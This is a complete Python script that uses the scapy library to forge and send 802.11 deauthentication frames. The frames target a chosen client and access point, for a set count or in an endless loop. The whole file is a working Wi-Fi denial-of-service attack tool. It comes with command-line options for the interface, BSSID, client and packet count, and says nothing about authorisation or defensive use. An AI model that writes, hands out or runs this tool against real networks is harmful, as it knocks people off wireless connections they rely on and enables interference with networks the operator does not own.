import argparse
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *

def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i',
                        '--interface',
                        help = 'Select an interface')
    parser.add_argument('-b',
                        '--bssid',
                        help = 'Select the routers BSSID')
    parser.add_argument('-c',
                        '--client',
                        help = 'Select the clients BSSID')
    parser.add_argument('-a',
                        '--amount',
                        type = int,
                        help = 'Select amount of packets to send')
    return parser.parse_args()

def send_deauth():

    # sending deauth packets
    pkt = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    sendp(pkt)
    print('Deauth-Pckt send to BSSID: ' + bssid)


if __name__ == '__main__':
    args = arg_parse()
    conf.verb = 0

    if args.interface and args.bssid and args.client:
        conf.iface = args.interface
        bssid = args.bssid
        client = args.client 

        if not args.amount:
            while True:
                send_deauth()

        elif args.amount > 0:
            amount = args.amount
            while amount > 0:
                send_deauth()
                amount -= 1
        else:
            print('[-] Invalid amount.')
    else:
        print('[-] Interface and BSSID required.')
